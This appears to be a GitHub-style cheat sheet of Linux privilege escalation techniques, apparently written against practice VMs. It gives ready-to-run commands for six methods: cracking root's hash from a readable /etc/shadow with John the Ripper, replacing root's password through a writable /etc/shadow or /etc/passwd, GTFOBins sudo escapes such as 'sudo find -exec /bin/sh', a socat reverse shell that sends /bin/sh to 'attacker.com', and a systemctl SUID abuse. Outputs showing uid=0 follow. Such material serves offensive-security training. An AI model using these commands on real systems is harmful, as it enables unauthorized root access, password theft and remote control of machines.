# Linux-Privilege-Escalation


# 🔥01: Readable /etc/shadow:

#### 👀The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note:  the /etc/shadow file on the VM is world-readable

At first check permission of /etc/shadow file using :

     ls -l /etc/shadow

    -rw-r--rw- 1 root shadow 842 Apr  9 17:28 /etc/shadow

Then , view the contents of the /etc/shadow file uisng :

              cat /etc/shadow
              
              root:$6$LRq2u1SvWmPgF$zCIh5qzquQ31ZcsL0ifM9GKh.pQRwHSKjJQSJI4Tkl5ELRHjqWTzag8upywqk.jT6/niiOIaMF9XW1/BnN55Y/:17298:0:99999:7:::
              daemon:*:17298:0:99999:7:::
              bin:*:17298:0:99999:7:::
              sys:*:17298:0:99999:7:::
              sync:*:17298:0:99999:7:::
              games:*:17298:0:99999:7:::
              man:*:17298:0:99999:7:::
              lp:*:17298:0:99999:7:::
              mail:*:17298:0:99999:7:::
              news:*:17298:0:99999:7:::
              uucp:*:17298:0:99999:7:::
              proxy:*:17298:0:99999:7:::
              www-data:*:17298:0:99999:7:::
              backup:*:17298:0:99999:7:::
              list:*:17298:0:99999:7:::
              irc:*:17298:0:99999:7:::
              gnats:*:17298:0:99999:7:::
              nobody:*:17298:0:99999:7:::
              libuuid:!:17298:0:99999:7:::
              Debian-exim:!:17298:0:99999:7:::
              sshd:*:17298:0:99999:7:::
              user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
              statd:*:17299:0:99999:7:::
              mysql:!:18133:0:99999:7:::




#### 👀Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Machine  and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Switch to the root user, using the cracked password:

    su root

#### 😍Happy Hacking 😍

# 🔥02: writeable /etc/shadow 

check the permssion of  /etc/shadow file using /etc/shadow. If you can edit the file , you can easily change the password of root .

     ls -l /etc/shadow 
    -rw-r--rw- 1 root shadow 842 Apr  9 17:28 /etc/shadow

#### 👀 Look : We can edit /etc/shadow file as we have  permission

Generate a new password hash with a password of your choice :

Here  , we  use mkpasswd command for generate a password 

Command :

           mkpasswd -m sha-512 iloveislam

Here  ,    
           
           -m use for method 
          
           sha-512 use for hashing the pasword 

           iloveislam is the password 

Then , edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

su root

#### 😍Happy Hacking 😍


# 🔥03:Writable /etc/passwd :

#### ⏰The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note : that the /etc/passwd file is world-writable

At first check permission of /etc/passwd file using 

     ls -l /etc/passwd

    -rw-r--rw- 1 root passwd 842 Apr  9 17:28 /etc/shadow


#### 🧑Generate a new password hash with a password of your choice:

    openssl passwd newpasswordhere

#### 👀Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

    su root

#### 👁️ Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

          user@debian:~$ nano /etc/passwd
          root:x:0:0:root:/root:/bin/bash
          daemon:x:1:1:daemon:/usr/sbin:/bin/sh
          bin:x:2:2:bin:/bin:/bin/sh
          sys:x:3:3:sys:/dev:/bin/sh
          sync:x:4:65534:sync:/bin:/bin/sync
          games:x:5:60:games:/usr/games:/bin/sh
          man:x:6:12:man:/var/cache/man:/bin/sh
          lp:x:7:7:lp:/var/spool/lpd:/bin/sh
          mail:x:8:8:mail:/var/mail:/bin/sh
          news:x:9:9:news:/var/spool/news:/bin/sh
          uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
          proxy:x:13:13:proxy:/bin:/bin/sh
          www-data:x:33:33:www-data:/var/www:/bin/sh
          backup:x:34:34:backup:/var/backups:/bin/sh
          list:x:38:38:Mailing List Manager:/var/list:/bin/sh
          irc:x:39:39:ircd:/var/run/ircd:/bin/sh
          gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
          nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
          libuuid:x:100:101::/var/lib/libuuid:/bin/sh
          Debian-exim:x:101:103::/var/spool/exim4:/bin/false
          sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
          user:x:1000:1000:user,,,:/home/user:/bin/bash
          statd:x:103:65534::/var/lib/nfs:/bin/false
          mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false


Now switch to the newroot user, using the new password:

    su newroot
    
#### 😍Happy Hacking 😍

# 🔥04: Shell Escape Sequences :

#### 👀 Shell Escape sequences is so powerful process for Privilege Escalation . In this process attacker use shell for privilege Escalation 

### Process :

             step 1 : check listed programs which sudo allows your normal user to run using  " sudo -l " command on terminal 
                    
             step 2: run shell escape according to your listed programs that was the result of sudo -l command 
             
             

☑️Attension Please : Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.


#### Example :
   
#### Step 1 :
              sudo - l 

     Matching Defaults entries for user on this host:
         env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

     User user may run the following commands on this host:
         (root) NOPASSWD: /usr/sbin/iftop
         (root) NOPASSWD: /usr/bin/find
         (root) NOPASSWD: /usr/bin/nano
         (root) NOPASSWD: /usr/bin/vim
         (root) NOPASSWD: /usr/bin/man
         (root) NOPASSWD: /usr/bin/awk
         (root) NOPASSWD: /usr/bin/less
         (root) NOPASSWD: /usr/bin/ftp
         (root) NOPASSWD: /usr/bin/nmap
         (root) NOPASSWD: /usr/sbin/apache2
         (root) NOPASSWD: /bin/more

 Ok  , that's great  . Now check all listed program escape shell from GTFOBins  one by one .

#### Step 2 : Go to GTFOBins website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )
        
         GTFOBins Result :
 
                        sudo find . -exec /bin/sh \; -quit

#### Step 3: Copy the shell escape of GTFOBins and paste it on your terminal 

     user@debian:~$ sudo find . -exec /bin/sh \; -quit
     sh-4.1# 
 
#### Step 4: Wow, you did well . Now , use id command and see you are now root 🥰

     sh-4.1# id
     uid=0(root) gid=0(root) groups=0(root)
     sh-4.1# 

#### 😍Happy Hacking 😍

# 🔥05: Root Privilegers using Shell Escape Sequences :
Acording to Previous process we will use :sudo -l and then  check Shell Escape Sequences and check it on GFTOBins

# Step 1:
        sudo -l 
Result :
    
    matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
    
# Step 2: Now check (root) NOPASSWD: /usr/bin/socat in GFTobins and use it 

Here , socat is our target Shell Escape which use for connected other machine . For liseting socat we must  upload Reverse Shell on our target Machine
Like that :

    RHOST=attacker.com
    RPORT=12345
    sudo socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
OR :

    sudo socat tcp-connect:my-machine ip:my-machine port number  exec:/bin/sh,pty,stderr,setsid,sigint,sane
    
    
# Step 3: After  , complete those steps sucessfully   We must use following command in your  pc :

        socat file:`tty`,raw,echo=0 tcp-listen:12345
        

If we successfully complete all those steps we get root power of target machine like that :

    socat file:`tty`,raw,echo=0 tcp-listen:12345
    /bin/sh: 0: can't access tty; job control turned off
    #id
    uid=0(root) gid=0(root) groups=0(root)
    #whoami
    root


# 🔥06: Root Privilegers using Shell Escape Sequences :

# Step 01 : Use given below command
            find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
# Check result and analyse properly
           -rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs


# Step 3 : Go to GTFOBins website and choice escape shell according to your result
      
### Example :
              if -rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl is vulnerable follow given below steps
              
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
            
# Step 4:
         cat /tmp/output
#### 😍Happy Hacking 😍
    
